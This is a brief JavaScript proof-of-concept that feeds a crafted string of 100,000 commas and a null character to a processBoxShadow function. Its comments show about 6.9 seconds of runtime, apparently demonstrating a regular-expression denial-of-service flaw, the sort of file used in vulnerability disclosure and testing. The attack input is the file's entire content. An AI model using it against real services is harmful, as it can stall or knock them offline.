"use strict";

var _processBoxShadow = _interopRequireDefault(require("./processBoxShadow.js"));
function _interopRequireDefault(e) { return e && e.__esModule ? e : { "default": e }; }
//Attack String :""+","*100000+"\u0000"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += ",";
}
str += "\0";
console.log((0, _processBoxShadow["default"])(str));

// real    0m6.880s
// user    0m6.826s
// sys     0m0.030s